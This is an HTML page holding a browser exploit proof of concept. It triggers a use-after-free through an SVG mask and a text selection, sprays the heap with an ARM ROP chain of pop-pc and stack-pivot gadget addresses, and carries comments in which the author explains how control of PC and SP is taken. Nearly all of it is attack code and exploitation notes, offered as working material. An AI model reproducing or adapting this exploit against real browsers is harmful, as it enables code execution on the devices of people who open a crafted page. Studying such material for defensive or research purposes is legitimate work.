<!DOCTYPE html> <!-- This is the svg masking glitch page inside the body tag with shellcode array "rop" sprayed into the heap with javascript just once. After the svg crash, the address of r0 will land somewhere in the middle of this array (cutting off the second half) and just 0x100 bytes or so from the actual binary source of this page. Between r0 and the page source there is some undetermined heap data.-->
<style>
text::selection{
    color: #888888;
}
</style>
<script>

function ob(size, lo, hi){ //the sprays the rop array below, again, in 8 byte chunks

	var obj= new ArrayBuffer(size); 
	var payload=  new Uint32Array(obj);
	//for(var i=0; i < size/4;i++) payload[i]=rop[index % ;
	payload[0]=lo;
	payload[1]=hi;
}

function spray4(iter) {   
/*
ints starting with 0x83 below are sequentially numbered for debugging reasons. Look around 0x830000FF for the interesting gadgets. The 0x001e23c0, 0x09040000 (poppc & .bmp address) pairs are arguments for the proceeding stack pivot 0x00337a38, which is: 
mov sp, r0 ; mov r0, r2 ; mov lr, r3 ; bx r1.
We use our controlled PC with:
0x00202f74 : ldmdb r0, {r0, r1, r2, r3, r4, r5, r6, r7, r8, sb, sl, ip, sp, lr, pc}
to back into that stack pivot.

On second thoughts, it might have been easier to just use add sp, sp, 0xABC to "jump forward" to this page source binary, but since going backwards worked fine I just stuck with that.
*/

rop = [0x83000000, 0x83000001, 0x83000002, 0x83000003, 0x83000004, 0x83000005, 0x83000006, 0x83000007, 0x83000008, 0x83000009, 0x8300000A, 0x8300000B, 0x8300000C, 0x8300000D, 0x8300000E, 0x8300000F, 0x83000010, 0x83000011, 0x83000012, 0x83000013, 0x83000014, 0x83000015, 0x83000016, 0x83000017, 0x83000018, 0x83000019, 0x8300001A, 0x8300001B, 0x8300001C, 0x8300001D, 0x8300001E, 0x8300001F, 0x83000020, 0x83000021, 0x83000022, 0x83000023, 0x83000024, 0x83000025, 0x83000026, 0x83000027, 0x83000028, 0x83000029, 0x8300002A, 0x8300002B, 0x8300002C, 0x8300002D, 0x8300002E, 0x8300002F, 0x83000030, 0x83000031, 0x83000032, 0x83000033, 0x83000034, 0x83000035, 0x83000036, 0x83000037, 0x83000038, 0x83000039, 0x8300003A, 0x8300003B, 0x8300003C, 0x8300003D, 0x8300003E, 0x8300003F, 0x83000040, 0x83000041, 0x83000042, 0x83000043, 0x83000044, 0x83000045, 0x83000046, 0x83000047, 0x83000048, 0x83000049, 0x8300004A, 0x8300004B, 0x8300004C, 0x8300004D, 0x8300004E, 0x8300004F, 0x83000050, 0x83000051, 0x83000052, 0x83000053, 0x83000054, 0x83000055, 0x83000056, 0x83000057, 0x83000058, 0x83000059, 0x8300005A, 0x8300005B, 0x8300005C, 0x8300005D, 0x8300005E, 0x8300005F, 0x83000060, 0x83000061, 0x83000062, 0x83000063, 0x83000064, 0x83000065, 0x83000066, 0x83000067, 0x83000068, 0x83000069, 0x8300006A, 0x8300006B, 0x8300006C, 0x8300006D, 0x8300006E, 0x8300006F, 0x83000070, 0x83000071, 0x83000072, 0x83000073, 0x83000074, 0x83000075, 0x83000076, 0x83000077, 0x83000078, 0x83000079, 0x8300007A, 0x8300007B, 0x8300007C, 0x8300007D, 0x8300007E, 0x8300007F, 0x83000080, 0x83000081, 0x83000082, 0x83000083, 0x83000084, 0x83000085, 0x83000086, 0x83000087, 0x83000088, 0x83000089, 0x8300008A, 0x8300008B, 0x8300008C, 0x8300008D, 0x8300008E, 0x8300008F, 0x83000090, 0x83000091, 0x83000092, 0x83000093, 0x83000094, 0x83000095, 0x83000096, 0x83000097, 0x83000098, 0x83000099, 0x8300009A, 0x8300009B, 0x8300009C, 0x8300009D, 0x8300009E, 0x8300009F, 0x830000A0, 0x830000A1, 0x830000A2, 0x830000A3, 0x830000A4, 0x830000A5, 0x830000A6, 0x830000A7, 0x830000A8, 0x830000A9, 0x830000AA, 0x830000AB, 0x830000AC, 0x830000AD, 0x830000AE, 0x830000AF, 0x830000B0, 0x830000B1, 0x830000B2, 0x830000B3, 0x830000B4, 0x830000B5, 0x830000B6, 0x830000B7, 0x830000B8, 0x830000B9, 0x830000BA, 0x830000BB, 0x830000BC, 0x830000BD, 0x830000BE, 0x830000BF, 0x830000C0, 0x830000C1, 0x830000C2, 0x830000C3, 0x830000C4, 0x830000C5, 0x830000C6, 0x830000C7, 0x830000C8, 0x830000C9, 0x830000CA, 0x830000CB, 0x830000CC, 0x830000CD, 0x830000CE, 0x830000CF, 0x830000D0, 0x830000D1, 0x830000D2, 0x830000D3, 0x830000D4, 0x830000D5, 0x830000D6, 0x830000D7, 0x830000D8, 0x830000D9, 0x830000DA, 0x830000DB, 0x830000DC, 0x830000DD, 0x830000DE, 0x830000DF, 0x830000E0, 0x830000E1, 0x830000E2, 0x830000E3, 0x830000E4, 0x830000E5, 0x830000E6, 0x830000E7, 0x830000E8, 0x830000E9, 0x830000EA, 0x830000EB, 0x830000EC, 0x830000ED, 0x830000EE, 0x830000EF, 0x830000F0, 0x830000F1, 0x830000F2, 0x830000F3, 0x830000F4, 0x830000F5, 0x830000F6, 0x830000F7, 0x830000F8, 0x830000F9, 0x830000FA, 0x830000FB, 0x830000FC, 0x830000FD, 0x830000FE, 0x09040000, 0x001e23c0, 0x09040000, 0x001e23c0, 0x09040000, 0x001e23c0, 0x09040000, 0x001e23c0, 0x09040000, 0x001e23c0, 0x09040000, 0x001e23c0, 0x09040000, 0x001e23c0, 0x09040000, 0x001e23c0, 0x09040000, 0x001e23c0, 0x09040000, 0x001e23c0, 0x00337a38, 0x00337a38, 0x00337a38, 0x00337a38, 0x00337a38, 0x00337a38, 0x00337a38, 0x00337a38, 0x00337a38, 0x00337a38, 0x00337a38, 0x00337a38, 0x00337a38, 0x83000120, 0x83000121, 0x83000122, 0x83000123, 0x83000124, 0x83000125, 0x83000126, 0x83000127, 0x83000128, 0x83000129, 0x8300012A, 0x8300012B, 0x8300012C, 0x8300012D, 0x8300012E, 0x8300012F, 0x83000130, 0x83000131, 0x83000132, 0x83000133, 0x83000134, 0x83000135, 0x83000136, 0x83000137, 0x83000138, 0x83000139, 0x8300013A, 0x8300013B, 0x8300013C, 0x8300013D, 0x8300013E, 0x8300013F, 0x83000140, 0x83000141, 0x83000142, 0x83000143, 0x83000144, 0x83000145, 0x83000146, 0x83000147, 0x83000148, 0x83000149, 0x8300014A, 0x8300014B, 0x8300014C, 0x8300014D, 0x8300014E, 0x8300014F, 0x83000150, 0x83000151, 0x83000152, 0x83000153, 0x83000154, 0x83000155, 0x83000156, 0x83000157, 0x83000158, 0x83000159, 0x8300015A, 0x8300015B, 0x8300015C, 0x8300015D, 0x8300015E, 0x8300015F, 0x83000160, 0x83000161, 0x83000162, 0x83000163, 0x83000164, 0x83000165, 0x83000166, 0x83000167, 0x83000168, 0x83000169, 0x8300016A, 0x8300016B, 0x8300016C, 0x8300016D, 0x8300016E, 0x8300016F, 0x83000170, 0x83000171, 0x83000172, 0x83000173, 0x83000174, 0x83000175, 0x83000176, 0x83000177, 0x83000178, 0x83000179, 0x8300017A, 0x8300017B, 0x8300017C, 0x8300017D, 0x8300017E, 0x8300017F, 0x83000180, 0x83000181, 0x83000182, 0x83000183, 0x83000184, 0x83000185, 0x83000186, 0x83000187, 0x83000188, 0x83000189, 0x8300018A, 0x8300018B, 0x8300018C, 0x8300018D, 0x8300018E, 0x8300018F, 0x83000190, 0x83000191, 0x83000192, 0x83000193, 0x83000194, 0x83000195, 0x83000196, 0x83000197, 0x83000198, 0x83000199, 0x8300019A, 0x8300019B, 0x8300019C, 0x8300019D, 0x8300019E, 0x8300019F, 0x830001A0, 0x830001A1, 0x830001A2, 0x830001A3, 0x830001A4, 0x830001A5, 0x830001A6, 0x830001A7, 0x830001A8, 0x830001A9, 0x830001AA, 0x830001AB, 0x830001AC, 0x830001AD, 0x830001AE, 0x830001AF, 0x830001B0, 0x830001B1, 0x830001B2, 0x830001B3, 0x830001B4, 0x830001B5, 0x830001B6, 0x830001B7, 0x830001B8, 0x830001B9, 0x830001BA, 0x830001BB, 0x830001BC, 0x830001BD, 0x830001BE, 0x830001BF, 0x830001C0, 0x830001C1, 0x830001C2, 0x830001C3, 0x830001C4, 0x830001C5, 0x830001C6, 0x830001C7, 0x830001C8, 0x830001C9, 0x830001CA, 0x830001CB, 0x830001CC, 0x830001CD, 0x830001CE, 0x830001CF, 0x830001D0, 0x830001D1, 0x830001D2, 0x830001D3, 0x830001D4, 0x830001D5, 0x830001D6, 0x830001D7, 0x830001D8, 0x830001D9, 0x830001DA, 0x830001DB, 0x830001DC, 0x830001DD, 0x830001DE, 0x830001DF, 0x830001E0, 0x830001E1, 0x830001E2, 0x830001E3, 0x830001E4, 0x830001E5, 0x830001E6, 0x830001E7, 0x830001E8, 0x830001E9, 0x830001EA, 0x830001EB, 0x830001EC, 0x830001ED, 0x830001EE, 0x830001EF, 0x830001F0, 0x830001F1, 0x830001F2, 0x830001F3, 0x830001F4, 0x830001F5, 0x830001F6, 0x830001F7, 0x830001F8, 0x830001F9, 0x830001FA, 0x830001FB, 0x830001FC, 0x830001FD, 0x830001FE, 0x830001FF, 0x83000200, 0x83000201, 0x83000202, 0x83000203, 0x83000204, 0x83000205, 0x83000206, 0x83000207, 0x83000208, 0x83000209, 0x8300020A, 0x8300020B, 0x8300020C, 0x8300020D, 0x8300020E, 0x8300020F, 0x83000210, 0x83000211, 0x83000212, 0x83000213, 0x83000214, 0x83000215, 0x83000216, 0x83000217, 0x83000218, 0x83000219, 0x8300021A, 0x8300021B, 0x8300021C, 0x8300021D, 0x8300021E, 0x8300021F, 0x83000220, 0x83000221, 0x83000222, 0x83000223, 0x83000224, 0x83000225, 0x83000226, 0x83000227, 0x83000228, 0x83000229, 0x8300022A, 0x8300022B, 0x8300022C, 0x8300022D, 0x8300022E, 0x8300022F, 0x83000230, 0x83000231, 0x83000232, 0x83000233, 0x83000234, 0x83000235, 0x83000236, 0x83000237, 0x83000238, 0x83000239, 0x8300023A, 0x8300023B, 0x8300023C, 0x8300023D, 0x8300023E, 0x8300023F, 0x83000240, 0x83000241, 0x83000242, 0x83000243, 0x83000244, 0x83000245, 0x83000246, 0x83000247, 0x83000248, 0x83000249, 0x8300024A, 0x8300024B, 0x8300024C, 0x8300024D, 0x8300024E, 0x8300024F, 0x83000250, 0x83000251, 0x83000252, 0x83000253, 0x83000254, 0x83000255, 0x83000256, 0x83000257, 0x83000258, 0x83000259, 0x8300025A, 0x8300025B, 0x8300025C, 0x8300025D, 0x8300025E, 0x8300025F, 0x83000260, 0x83000261, 0x83000262, 0x83000263, 0x83000264, 0x83000265, 0x83000266, 0x83000267, 0x83000268, 0x83000269, 0x8300026A, 0x8300026B, 0x8300026C, 0x8300026D, 0x8300026E, 0x8300026F, 0x83000270, 0x83000271, 0x83000272, 0x83000273, 0x83000274, 0x83000275, 0x83000276, 0x83000277, 0x83000278, 0x83000279, 0x8300027A, 0x8300027B, 0x8300027C, 0x8300027D, 0x8300027E, 0x8300027F, 0x83000280, 0x83000281, 0x83000282, 0x83000283, 0x83000284, 0x83000285, 0x83000286, 0x83000287, 0x83000288, 0x83000289, 0x8300028A, 0x8300028B, 0x8300028C, 0x8300028D, 0x8300028E, 0x8300028F, 0x83000290, 0x83000291, 0x83000292, 0x83000293, 0x83000294, 0x83000295, 0x83000296, 0x83000297, 0x83000298, 0x83000299, 0x8300029A, 0x8300029B, 0x8300029C, 0x8300029D, 0x8300029E, 0x8300029F, 0x830002A0, 0x830002A1, 0x830002A2, 0x830002A3, 0x830002A4, 0x830002A5, 0x830002A6, 0x830002A7, 0x830002A8, 0x830002A9, 0x830002AA, 0x830002AB, 0x830002AC, 0x830002AD, 0x830002AE, 0x830002AF, 0x830002B0, 0x830002B1, 0x830002B2, 0x830002B3, 0x830002B4, 0x830002B5, 0x830002B6, 0x830002B7, 0x830002B8, 0x830002B9, 0x830002BA, 0x830002BB, 0x830002BC, 0x830002BD, 0x830002BE, 0x830002BF, 0x830002C0, 0x830002C1, 0x830002C2, 0x830002C3, 0x830002C4, 0x830002C5, 0x830002C6, 0x830002C7, 0x830002C8, 0x830002C9, 0x830002CA, 0x830002CB, 0x830002CC, 0x830002CD, 0x830002CE, 0x830002CF, 0x830002D0, 0x830002D1, 0x830002D2, 0x830002D3, 0x830002D4, 0x830002D5, 0x830002D6, 0x830002D7, 0x830002D8, 0x830002D9, 0x830002DA, 0x830002DB, ]	
	var x=0;
	for(var i=0; i < iter; i++){
		x = (i*2) % 732;
		ob(0x8, rop[x], rop[x+1]); //eb4
	}
}

window.addEventListener("load", function () {

    //spray4(0xa00);  //rop len in 8 byte chunks
    var range = document.createRange();
    var selection = document.getSelection();
    range.setStart(m1, 0);
    range.setEnd(id1, id1.childNodes.length);
	spray4(300);  //rop len in 8 byte chunks. the timing/order of this spray puts the rop shellcode (and page source) on either side of r0 (the prototypical current object address), which gives us forward/backwards options of taking control since we will soon have PC (I used an ldmdb r0 gadget to set up control by going backwards "load multiple regs and decrement before". this puts PC and SP before r0)
	alert("a");   //the arguments (r0/r1) of this follow up pivot gadget: 0x00337a38 : mov sp, r0 ; mov r0, r2 ; mov lr, r3 ; bx r1
        //the above alert stop is for timing and stability
    selection.addRange(range); //this exact javascript sets off the svg glitch.
	
    
}, false);

</script>
<body>

<!-- this is where the magic happens, and tbo, I'm not quite sure what specifically is going wrong here, other than it results in a UAF. but give me a crash, and I just might be able to get control, Lord Lenny willing -->

<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
 <defs>
  <mask id="m1" x="0" y="0" width="200" height="200">
   <circle cx="100" cy="100" r="20" fill="#888888"/>
   <text y="100" fill="#888888" font-size="50">
   Text
   </text>
  </mask>
 </defs>
 <rect id="id1" mask="url(#m1)" x="10" y="10" width="180" height="180"/>
</svg>
</body>